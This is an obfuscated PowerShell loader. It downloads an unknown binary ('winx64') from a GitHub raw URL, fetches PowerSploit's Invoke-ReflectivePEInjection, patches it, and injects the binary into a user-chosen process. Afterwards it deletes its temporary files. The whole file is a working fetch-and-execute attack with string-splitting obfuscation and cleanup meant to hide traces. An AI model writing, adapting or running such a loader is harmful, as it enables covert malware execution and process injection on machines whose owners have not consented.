$ErrorActionPreference = @("St","op") -join ""

$_0x91A = @(
"https://raw",
".githubusercontent",
".com/CONNERZZZ",
"/CONNERZZZ/refs",
"/heads/main/",
"winx64"
) -join ""

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue

$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))

$_0x5F9 = $_0x7C1.DownloadData($_0x91A)

$_0x3D2 = @(
"https://raw",
".githubusercontent",
".com/PowerShellMafia",
"/PowerSploit/master",
"/CodeExecution/",
"Invoke-ReflectivePEInjection.ps1"
) -join ""

$_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"

Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing

$_0xA77 = Get-Content $_0x8E4 -Raw

$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'

$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'

$_0xC11 = "$env:TEMP\Reflective_fixed.ps1"

$_0xA77 | Set-Content $_0xC11 -Encoding UTF8

. $_0xC11

# 1. ล้างหน้าจอ (ขึ้นหน้าใหม่)
Clear-Host 

# 2. รับค่าจากผู้ใช้งาน
 $_0x2AA = Read-Host (@("Enter"," PID") -join "")

# 3. ตรวจสอบว่าใส่ข้อมูลมาหรือไม่ แล้วแสดงข้อความสำเร็จ
if ($0x2AA) {
    Write-Host "Success! Input received: $0x2AA" -ForegroundColor Green
} else {
    Write-Host "No input provided." -ForegroundColor Red
}
start $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA

Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue

Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
Remove-Item -Force -ErrorAction SilentlyContinue


